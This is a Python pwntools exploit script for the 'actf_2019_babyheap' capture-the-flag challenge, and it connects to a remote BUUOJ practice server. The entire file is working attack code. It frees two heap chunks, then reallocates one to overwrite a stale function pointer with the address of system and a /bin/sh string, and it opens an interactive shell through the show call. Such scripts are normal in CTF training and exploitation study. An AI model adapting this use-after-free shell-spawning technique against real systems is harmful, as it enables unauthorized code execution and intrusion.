# coding:utf-8
from os import system
from pwn import *
context.log_level = 'debug'

proc_name = 'actf_2019_babyheap'
libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
elf = ELF(proc_name)

islocal = 0
if islocal:
    p = process(proc_name)
else:
    p = remote('node4.buuoj.cn', 26987)

def debug(addr, PIE=True):
    if PIE:
        text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(p.pid)).readlines()[1], 16)
        gdb.attach(p,'b *{}'.format(hex(text_base+addr)))
    else:
        gdb.attach(p,"b *{}".format(hex(addr)))


def add(size, content):
    p.recvuntil("choice: ")
    p.sendline("1")
    p.recvuntil("size: \n")
    p.sendline(str(size))
    p.recvuntil("content: \n")
    p.send(content)

def delete(index):
    p.recvuntil("choice: ")
    p.sendline("2")
    p.recvuntil("index: \n")
    p.sendline(str(index))

def show(index):
    p.recvuntil("choice: ")
    p.sendline("3")
    p.recvuntil("index: \n")
    p.sendline(str(index))

def pwn():
    bin_sh_addr = 0x602010
    system_addr = elf.sym['system']

    add(0x30, b'a' * 8)
    add(0x30, b'b' * 8)
    # debug(0)
    delete(0)
    delete(1)
    # debug(0)
    add(0x10, p64(bin_sh_addr) + p64(system_addr))
    show(0)
    p.interactive()

if __name__ == '__main__':
    pwn()